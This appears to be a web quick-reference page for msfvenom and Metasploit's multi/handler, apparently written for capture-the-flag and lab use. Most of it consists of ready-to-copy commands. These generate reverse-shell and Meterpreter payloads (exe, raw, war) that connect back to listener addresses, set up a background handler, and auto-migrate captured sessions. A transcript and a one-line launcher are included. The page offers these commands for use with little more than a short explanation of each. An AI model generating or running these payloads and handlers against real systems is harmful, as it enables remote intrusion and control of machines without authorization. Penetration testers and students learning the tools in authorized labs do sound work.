msfvenom — Quick reference

Generate payloads for tests (exe, elf, war, python, raw...). Replace LHOST/LPORT with your listener IP/port.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw > shell.bin
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f war -o shell.war

Flags cheat-sheet

-p (payload)    -f (format)    LHOST/LPORT    -b (badchars)    -e (encoder) -i (iterations)
--list payloads   --platform java  -o (output file or use > redirect)

Parameterize listener

Set your LHOST & LPORT here and the handler code will be updated below for easy copying.

Handler controls
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.16.40
set LPORT 4444
set ExitOnSession false
exploit -j -z
Notes:
- -j runs handler as a background job. -z "do not interact"; together they start the handler in the background.
- ExitOnSession false keeps handler alive after a session is established.

msfconsole — exploit/multi/handler (explanation & copiable commands)

Place these commands into msfconsole to accept incoming Meterpreter / shell sessions. The code block below is parameterized by the inputs on the right.

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.40
LHOST => 10.10.16.40
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
msf6 exploit(multi/handler) > exploit -j -z

Line-by-line explanation

  • use exploit/multi/handler — load the generic handler module that waits for reverse connections.
  • set PAYLOAD windows/meterpreter/reverse_tcp — tell the handler which payload to expect so it can properly decode an incoming session.
  • set LHOST & set LPORT — specify where the payload should connect back (your reachable IP/port).
  • set ExitOnSession false — keep the handler alive after a session is created (so it can accept further sessions).
  • set AutoRunScript post/windows/manage/migrate — automatically run the specified post module (here: migrate the Meterpreter payload into a stable process) when a session is created.
  • exploit -j -z — start the handler as a background job (-j) and do not interact with sessions automatically (-z), leaving them to be managed by you or scripts.

Best practices & tips

  • Use set ExitOnSession false when you want one handler to accept multiple connections without restarting.
  • AutoRunScript is powerful: common scripts include post/windows/manage/migrate, post/multi/manage/smart_migrate, or your custom scripts.
  • For multi-host CTF work, run handlers in background jobs and use sessions -i to interact when needed.
  • Always validate LHOST is reachable from the target (consider VPNs, NAT, or port forwarding).
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.16.40; set LPORT 4444; set ExitOnSession false; exploit -j -z"
